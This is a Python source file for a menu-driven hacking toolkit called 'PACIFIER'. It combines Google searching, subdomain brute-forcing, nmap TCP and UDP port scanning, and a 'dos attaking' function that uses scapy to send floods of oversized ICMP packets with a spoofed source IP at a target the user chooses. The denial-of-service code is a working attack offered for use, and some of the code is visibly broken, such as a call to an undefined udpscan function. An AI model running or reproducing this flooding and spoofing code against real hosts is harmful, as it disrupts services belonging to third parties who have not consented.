
from scapy.all import *
import requests
from googlesearch import search
import nmap
import pyfiglet
from datetime import datetime
import subprocess
import os


if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
#Google
def google():
	querry = input("Enter your querry :")

	for i in search(querry, tld="com", num =10, stop=10, pause=2):
		print(i)
#end of Google


#sub domains

# function for scanning subdomains
def sed():
 def domain_scanner(domain_name,sub_domnames):
	 print('----URL after scanning subdomains----')
	
	# loop for getting URL's
	 for subdomain in sub_domnames:
		
		# making url by putting subdomain one by one
		 url = f"https://{subdomain}.{domain_name}"
		
		# using try catch block to avoid crash of the
		# program
		 try:
			# sending get request to the url
			 requests.get(url)
			
			# if after putting subdomain one by one url
			# is valid then printing the url
			 print(f'[+] {url}')
			
			# if url is invalid then pass it
		 except requests.ConnectionError:
			 pass

# main function
 if __name__ == '__main__':
	
	# inputting the domain name
	 dom_name = input("Enter the Domain Name:")

	# opening the subdomain text file
	 with open('subdomain_names1.txt','r') as file:
		
		# reading the file
		 name = file.read()
		
		# using spilitlines() function storing the list
		# of splitted strings
		 sub_dom = name.splitlines()
		
	# calling the function for scanning the subdomains


	# and getting the url
	 domain_scanner(dom_name,sub_dom)
	

#end of sub domains



#scanner
def scanner():
	def portscan():
	        begin =int(input("input range of port number from  :"))
	        end =int(input("range of port number end   :"))
	        target =input("Enter ip Number  :")
   

	        scanner = nmap.PortScanner()
   
	        for i in range(begin,end+1):
   
  
	                res = scanner.scan(target,str(i))
   
	                res = res['scan'][target]['tcp'][i]['state']
   
	                print(f'port {i} is {res}.')



	def udpscanner():

	        nm = nmap.PortScanner()
	        nm.scan(hosts=input("enter ip [ip range supported  :"), arguments='-p 161 -sU ')
	        hosts_list = [(x, nm[x][u'udp'][161]['state']) for x in nm.all_hosts()]
	        for host, status in hosts_list:
	            print('{0}:{1}'.format(host, status))

	print("1.port scan\ 2.UDP scan")

	scannumber=int(input("Enter Scan Number 1/2"))

	if scannumber==1:
		portscan()
	elif scannumber==2:
		udpscan()



#end of scanner








#DOS
def dos():
	SOURCE_IP=input("source ip    :")
	TARGET_IP=input("target ip    :") 
	MESSAGE="T"
	NUMBER_PACKETS=int(input("packet count   :"))

	pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
	send(NUMBER_PACKETS*pingOFDeath)
#end of Dos



#banner
#def banner():
ascii_banner =pyfiglet.figlet_format("PACIFIER")
print(ascii_banner)
now = datetime.now()
current_time = now.strftime("%H:%M:%S")
print("local time :  ", current_time)

#end of banner



#intro

 


def menu():
 print("\n1 passive info gathering\n")
 print("2 sub domain enumaration\n")
 print("3 scanner\n")
 print("4 dos attaking\n")
 print("5 help\n")

 #start = int(input("Enter Opt     :"))
#end of into
#if start==1:
#	google()
#elif start==2:
#	sed()
#elif start==3:
#	scanner()
#elif start==4:
#	dos()
#elif start==5:
#enter help text
#	print("h")#
def help():
 print ("\n...do you  need help for this...\n")

if __name__=='__main__':
    while(True):
        menu()
        option = ''
        try:
            option = int(input('Enter your choice: '))
        except:
            print('\n......Wrong input. Please enter a number .....\n')
        #Check what choice was entered and act accordingly
        if option == 1:
           google()
        elif option == 2:
            sed()
        elif option == 3:
            scanner()
        elif option == 4:
            dos()
        
        elif option == 5:
            help()

        else:
            print('\n Invalid option. Please enter a number between 1 and 5')
